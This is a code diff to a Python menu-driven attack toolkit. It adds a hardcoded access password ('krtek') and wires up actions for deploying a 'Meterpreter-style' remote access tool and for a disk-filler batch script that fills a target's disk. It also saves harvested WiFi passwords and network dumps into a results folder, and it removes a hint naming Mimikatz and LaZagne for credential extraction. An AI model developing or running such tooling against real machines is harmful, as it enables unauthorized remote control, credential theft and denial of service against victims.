@@ -64,6 +64,10 @@ def get_password_hash():
 			return json.load(f)["password_hash"]
 
 
+base_dir = os.path.dirname(os.path.abspath(__file__))
+results_dir = "results"
+os.makedirs(results_dir, exist_ok=True)
+
 stored_hash = get_password_hash()
 
 cls()
@@ -71,6 +75,7 @@ cls()
 # ORIGINAL input password - change BEFORE deployment
 while True:
 	#pw = getpass.getpass("Enter password: ")
+	#if hash_pw(pw) == stored_hash:
 	pw = "krtek"
 	if hash_pw(pw) == stored_hash:
 		print("Access granted.")
@@ -1000,15 +1005,13 @@ while True:
 	# ========== RAT ACTION ==========
 	elif action == "RAT" or action == "rat":
 		logging.info(f"Chosen action RAT to deploy remote access tool")
-		print(Fore.YELLOW + """
-    .d8888b.  888                     888                      
-    d88P  Y88b 888                     888                      
-    888    888 888                     888                      
-    888        88888b.   .d88b.   .d88888  .d88b.  888d888      
-    888        888 "88b d8P  Y8b d88" 888 d8P  Y8b 888P"        
-    888    888 888  888 88888888 888  888 88888888 888          
-    Y88b  d88P 888  888 Y8b.     Y88b 888 Y8b.     888          
-    "Y8888P"  888  888  "Y8888   "Y88888  "Y8888  888          
+		print(Fore.YELLOW + r"""
+	_________ .__               .___  .___             
+	\_   ___ \|  |__   ____   __| _/__| _/____ _______ 
+	/    \  \/|  |  \_/ __ \ / __ |/ __ |\__  \\_  __ \
+	\     \___|   Y  \  ___// /_/ / /_/ | / __ \|  | \/
+ 	\______  /___|  /\___  >____ \____ |(____  /__|   
+    	    \/     \/     \/     \/    \/     \/              
     
     Meterpreter-style Remote Access Tool
     """)
@@ -1278,12 +1281,10 @@ while True:
 #Action DiskFiller = filling up disk space
 	elif action == "DiskFill" or action == "diskfill":
 		logging.info(f"Chose action DiskFill to fill a target computer disk")
-		usermovefile=input("Did you move the installed files from each other? (meaning this program being somewhere different than the other files included in this repo? y/n: ")
-		if usermovefile == "y":
-			pathtodiskfiller=input("Enter path to diskfiller.bat (example d:\\filler\\diskfiller.bat), will be in the same folder as this program: ")
-			subprocess.run(pathtodiskfiller, shell=True)
-		else:
-			subprocess.run("diskfiller.bat", shell=True)
+		base_dir = os.path.dirname(os.path.abspath(__file__))
+		diskfiller_path = os.path.join(base_dir, "modules", "diskfiller.bat")
+		subprocess.run(diskfiller_path, shell=True)
+		input("Press Enter to continue...")
 
 		logging.info(f"Started the diskfiller.bat")
 	
@@ -1801,7 +1802,7 @@ while True:
 				
 				if wifi_passwords:
 					# Save to JSON
-					output_file = f"wifi_passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+					output_file = os.path.join(results_dir, "WifiCrack.json")
 					with open(output_file, 'w') as f:
 						json.dump(wifi_passwords, f, indent=4)
 					
@@ -1879,7 +1880,8 @@ while True:
 			print(Fore.YELLOW + "[!] Could not check WiFi")
 		
 		# 4. Save results
-		output_file = f"network_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+		results_dir="results"
+		output_file = os.path.join(results_dir, "NetScan.json")
 		with open(output_file, 'w') as f:
 			f.write("="*60 + "\n")
 			f.write("NETWORK INFORMATION DUMP\n")
@@ -1892,11 +1894,6 @@ while True:
 				f.write(line + "\n")
 		
 		print(Fore.GREEN + f"\n[+] Results saved to {output_file}")
-		print(Fore.YELLOW + "\n[*] Note: Windows encrypts passwords with DPAPI")
-		print(Fore.YELLOW + "[*] For actual password extraction, use tools like:")
-		print(Fore.CYAN + "    • Mimikatz (requires admin)")
-		print(Fore.CYAN + "    • Lazagne")
-		print(Fore.CYAN + "    • Windows Credential Manager UI")
 		
 		input("\nPress Enter to continue...")
 		cls()
